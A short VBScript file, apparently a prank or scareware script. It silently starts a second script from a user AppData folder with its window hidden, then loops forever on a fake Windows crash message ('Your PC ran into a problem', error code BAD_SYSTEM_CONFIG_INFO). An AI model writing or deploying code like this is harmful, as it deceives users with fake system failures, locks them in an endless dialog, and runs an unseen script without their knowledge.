Set ws = CreateObject("WScript.Shell")
ws.Run "C:\Users\Lzhyrifx\AppData\Command\Error\Waitshort.vbs",0
do
msgbox "Your PC ran into a problem and needs to shut down."+chr(13)+"We're just collecting some error info.and then we'll shut down for you."+chr(13)+"Please eait..."+chr(13)+"Error code:BAD_SYSTEM_CONFIG_INFO",16,"Error"
loop